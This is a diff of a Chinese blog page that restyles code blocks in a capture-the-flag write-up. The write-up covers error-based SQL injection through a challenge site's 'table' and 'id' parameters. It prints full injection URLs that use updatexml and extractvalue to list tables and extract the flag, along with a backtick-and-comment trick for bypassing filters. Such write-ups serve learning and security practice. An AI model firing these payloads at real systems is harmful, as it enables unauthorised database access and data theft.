@@ -294,7 +294,8 @@
     <!-- Custom Head -->
     
 
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
 
     
@@ -479,20 +480,36 @@
     
         <p><a href="http://114.55.36.69:20680/" target="_blank" rel="external">http://114.55.36.69:20680/</a><br>做了n久做不出,也不知道题目是哪里来的</p>
 <h2 id="咸鱼的我"><a href="#咸鱼的我" class="headerlink" title="咸鱼的我"></a>咸鱼的我</h2><p>过滤了<code>*</code>,<code>union</code>,<code>column</code><br>所以爆出来表名就不知所措了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news&amp;id=1 or(updatexml(1,concat(0x7e,(SELECT distinct group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1))</div><div class="line"></div><div class="line">=&gt; &apos;~error_flag,error_news~&apos;</div></pre></td></tr></table></figure>
-<p>然后后感觉<code>id</code>这里过滤好严,试一试<code>table</code>那里<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news`%23&amp;id=1</div></pre></td></tr></table></figure></p>
-<p>这样子应该是把他截断了,所以显示是正常的<br>然后很笨的我尝试在后边加东西发现….<br>啊，怎么没用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news` where id =4 %23&amp;id=1</div></pre></td></tr></table></figure></p>
+<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news&id=1 or(updatexml(1,concat(0x7e,(SELECT distinct group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1))
+
+=> '~error_flag,error_news~'
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>然后后感觉<code>id</code>这里过滤好严,试一试<code>table</code>那里</p>
+<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news`%23&id=1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>这样子应该是把他截断了,所以显示是正常的<br>然后很笨的我尝试在后边加东西发现….<br>啊，怎么没用</p>
+<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news` where id =4 %23&id=1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>我就是这么菜，就停在这里了</p>
 <p>然后后来问了大佬</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=news`%23`where id =4 %23&amp;id=1 (%23是注释#)</div></pre></td></tr></table></figure>
+<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=news`%23`where id =4 %23&id=1 (%23是注释#)
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>知道这样子就可以了</p>
 <p>大概是先<code>desc</code>了table，然后table存在的情况下才进行查询,而且才知道<code>table</code>这里过滤不严</p>
-<p>按照大佬说的大概是<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">desc `error_$&#123;table&#125;`;</div><div class="line"><span class="comment">-- table存在的话,再</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> error_$&#123;<span class="keyword">table</span>&#125; <span class="keyword">where</span> <span class="keyword">id</span> = $<span class="keyword">id</span>;</div></pre></td></tr></table></figure></p>
-<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>问了下Bendawang师傅，果然。。。师傅做题就和切菜一样，几分钟丢回来一个答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://114.55.36.69:20680/index.php?table=flag`%23` where 0=extractvalue(1,(select flag_you_will_never_know from error_flag))%23`&amp;id=1</div></pre></td></tr></table></figure></p>
+<p>按照大佬说的大概是</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">desc</span> <span class="token punctuation">`</span>error_${<span class="token keyword">table</span>}<span class="token punctuation">`</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">-- table存在的话,再</span>
+<span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> error_${<span class="token keyword">table</span>} <span class="token keyword">where</span> id <span class="token operator">=</span> $id<span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>问了下Bendawang师傅，果然。。。师傅做题就和切菜一样，几分钟丢回来一个答案</p>
+<pre class="line-numbers language-url"><code class="language-url">http://114.55.36.69:20680/index.php?table=flag`%23` where 0=extractvalue(1,(select flag_you_will_never_know from error_flag))%23`&id=1
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>他这个能够判断出有无table，只能是提前先执行了show COLUMNS 或是desc</p>
 </blockquote>
-<p>然后学习了QAQ<br>这个<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`#`....#</div></pre></td></tr></table></figure></p>
+<p>然后学习了QAQ<br>这个</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token punctuation">`</span><span class="token comment" spellcheck="true">#`....#</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <p>如果列名前缀有有一个`,那第一个`闭合了前面的`,然后第一个#就可以注释掉后面的<br>如果列名前缀没有`,那`#`就作为列名的别名，最后一个#起到注释作用</p>
 </blockquote>
